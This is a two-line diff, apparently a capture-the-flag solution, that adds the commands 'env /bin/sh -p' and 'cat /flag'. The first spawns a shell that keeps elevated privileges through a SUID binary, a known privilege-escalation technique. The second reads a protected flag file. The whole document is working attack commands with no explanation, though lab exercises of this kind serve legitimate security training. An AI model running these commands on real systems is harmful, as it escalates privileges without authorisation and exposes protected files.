@@ -1,0 +1,2 @@
+env /bin/sh -p
+cat /flag
